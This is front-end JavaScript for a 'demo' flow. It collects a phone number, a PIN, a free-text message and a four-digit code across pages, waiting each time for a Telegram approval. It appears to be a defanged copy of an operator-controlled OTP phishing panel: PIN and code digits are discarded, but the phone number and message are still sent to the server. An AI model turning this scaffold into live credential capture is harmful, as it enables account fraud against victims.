(() => {
  const $ = id => document.getElementById(id);
  const pages = ["pagePhone", "pageOtp1", "pageOtp2", "pageSuccess"];
  let activeRequest = null, pollTimer = null, busy = false, activeStage = null;

  function showPage(id) { pages.forEach(p => { $(p).hidden = p !== id; }); }
  function setStatus(id, text, kind = "") { $(id).textContent = text; $(id).className = `status ${kind}`.trim(); }
  function globalStatus(text, kind = "") { setStatus("globalStatus", text, kind); }
  function spin(text = "Processing demo…") { $("loadingText").textContent = text; $("loadingOverlay").hidden = false; }
  function stopSpin() { $("loadingOverlay").hidden = true; }
  function stopPoll() { if (pollTimer) clearTimeout(pollTimer); pollTimer = null; }

  $("phone").addEventListener("input", () => {
    $("phone").value = $("phone").value.replace(/\D/g, "").slice(0, 9);
    $("pinWrap").hidden = $("phone").value.length !== 9;
    if (!$("pinWrap").hidden) $("demoPin").focus();
    if ($("phone").value.length !== 9) { $("demoPin").value = ""; $("pinSubmit").hidden = true; }
  });
  $("demoPin").addEventListener("input", () => {
    $("demoPin").value = $("demoPin").value.replace(/\D/g, "").slice(0, 5);
    if ($("demoPin").value.length === 5) {
      $("demoPin").value = ""; // never retain or transmit these digits
      $("pinSubmit").hidden = false;
      globalStatus("Demo entry complete. Continue to request review.", "ok");
    }
  });
  $("pinSubmit").addEventListener("click", () => {
    showPage("pageOtp1");
    globalStatus("Next: submit an ordinary demo message for review.");
  });

  $("otp1Submit").addEventListener("click", () => submitStage("message_demo", $("message").value.trim()));
  $("otp2Submit").addEventListener("click", () => {
    const code = $("demoCode").value.replace(/\D/g, "").slice(0, 4);
    $("demoCode").value = ""; // never transmit or retain demo digits
    if (code.length !== 4) { setStatus("otp2Status", "Enter exactly four demo digits.", "err"); return; }
    submitStage("code_demo", "");
  });

  async function submitStage(stage, message) {
    if (busy) return;
    if (stage === "message_demo" && !message) {
      setStatus("otp1Status", "Enter an ordinary demo message first.", "err"); return;
    }
    busy = true; activeStage = stage;
    $("otp1Submit").disabled = true; $("otp2Submit").disabled = true;
    spin(stage === "message_demo" ? "Waiting for demo message review…" : "Waiting for demo code-stage review…");
    if (stage === "message_demo") setStatus("otp1Status", "Waiting for Telegram approval or decline…");
    else setStatus("otp2Status", "Waiting for Telegram approval or decline…");
    try {
      const response = await fetch("/api/demo-request", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone: $("phone").value, stage, message })
      });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Could not create demo request.");
      activeRequest = data.reference;
      pollStatus();
    } catch (err) {
      busy = false; stopSpin(); $("otp1Submit").disabled = false; $("otp2Submit").disabled = false;
      setStatus(stage === "message_demo" ? "otp1Status" : "otp2Status", err.message, "err");
    }
  }

  async function pollStatus() {
    if (!activeRequest) return;
    try {
      const response = await fetch(`/api/demo-request/${encodeURIComponent(activeRequest)}`, { cache: "no-store" });
      const data = await response.json();
      if (!response.ok) throw new Error(data.error || "Unable to check review status.");
      if (data.status === "pending") { pollTimer = setTimeout(pollStatus, 2000); return; }
      busy = false; stopSpin(); $("otp1Submit").disabled = false; $("otp2Submit").disabled = false;
      if (data.status === "approved") {
        if (activeStage === "message_demo") {
          showPage("pageOtp2"); globalStatus("Demo message approved. Continue to the second demo stage.", "ok");
          setStatus("otp2Status", "Enter four demo digits, then request review.");
        } else if (activeStage === "code_demo") {
          showPage("pageSuccess"); globalStatus("The demo was approved and completed.", "ok");
        } else {
          showPage("pageOtp1");
        }
      } else {
        // Return to the same demo stage so the user can re-enter it.
        if (activeStage === "message_demo") {
          $("message").value = ""; showPage("pageOtp1");
          setStatus("otp1Status", "Declined. Enter a new ordinary message and submit again.", "err");
        } else {
          $("demoCode").value = ""; showPage("pageOtp2");
          setStatus("otp2Status", "Declined. Enter four new demo digits and submit again.", "err");
        }
        globalStatus("Demo request declined. Re-enter this demo step.", "err");
      }
      activeRequest = null;
    } catch (err) {
      busy = false; stopSpin(); $("otp1Submit").disabled = false; $("otp2Submit").disabled = false;
      setStatus(activeStage === "message_demo" ? "otp1Status" : "otp2Status", err.message, "err");
    }
  }

  $("restart").addEventListener("click", () => {
    stopPoll(); stopSpin(); activeRequest = null; activeStage = null; busy = false;
    $("phone").value = ""; $("demoPin").value = ""; $("message").value = ""; $("demoCode").value = "";
    $("pinWrap").hidden = true; $("pinSubmit").hidden = true;
    $("otp1Submit").disabled = false; $("otp2Submit").disabled = false;
    setStatus("otp1Status", "Waiting for a demo message.");
    setStatus("otp2Status", "The digits will not be transmitted.");
    showPage("pagePhone"); globalStatus("Ready to begin the demonstration.");
  });
})();
